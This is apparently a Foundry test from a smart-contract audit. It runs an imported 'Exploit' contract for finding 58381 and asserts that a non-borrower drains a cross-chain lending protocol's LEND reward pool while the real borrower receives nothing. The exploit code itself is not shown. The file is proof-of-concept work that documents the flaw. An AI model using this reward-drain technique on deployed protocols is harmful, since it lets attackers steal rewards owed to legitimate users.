// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58381-lend-incorrect-lend-reward-distribution-for-cross-chain-borrows.sol";

contract Finding58381Test is Test {
    function testFinding58381() public {
        Exploit e = new Exploit();
        e.run();

        // Real borrower on this chain (Alice) got ZERO LEND, non-borrower (Bob =
        // the exploit contract) drained the reward pool.
        uint256 aliceLend = e.aliceLend();
        uint256 bobLend = e.bobLend();
        emit log_named_uint("alice LEND (real borrower)", aliceLend);
        emit log_named_uint("bob   LEND (non-borrower)", bobLend);

        assertEq(aliceLend, 0, "real borrower should have been under-rewarded to 0");
        assertEq(bobLend, e.PRINCIPLE(), "non-borrower should drain the full reward");
        assertEq(
            e.lend().balanceOf(address(e)),
            e.PRINCIPLE(),
            "attacker did not receive drained LEND"
        );
        assertGt(bobLend, aliceLend);
    }
}
